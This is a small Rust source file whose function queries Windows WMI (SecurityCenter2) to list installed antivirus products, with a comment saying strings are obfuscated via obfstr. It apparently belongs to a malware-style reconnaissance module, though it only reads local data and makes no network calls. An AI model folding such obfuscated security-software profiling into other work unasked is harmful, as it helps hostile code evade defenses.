use fmtools::format; // using obfstr to obfuscate
use serde::Deserialize;
use wmi::{COMLibrary, WMIConnection};

#[derive(Deserialize, Debug)]
#[allow(non_snake_case)]
struct AntiVirusProduct {
    displayName: String,
}

pub(crate) fn get_av() -> String {
    let com_con = match COMLibrary::new() {
        Ok(con) => con,
        Err(e) => return format!("Failed to initialize COM library: "{e}),
    };

    let wmi_con =
        match WMIConnection::with_namespace_path(&format!("ROOT\\SecurityCenter2"), com_con) {
            Ok(con) => con,
            Err(e) => return format!("Failed to connect to WMI: "{e}),
        };

    let res = match wmi_con
        .raw_query::<AntiVirusProduct>(&format!("SELECT displayName FROM AntiVirusProduct"))
    {
        Ok(res) => res,
        Err(e) => return format!("Failed to query WMI: "{e}),
    };

    let mut avs = Vec::<String>::new();
    for av in res {
        avs.push(av.displayName);
    }

    if avs.is_empty() {
        format!("No antivirus products found.")
    } else {
        format!("Antivirus products: "{avs.join(", ")})
    }
}
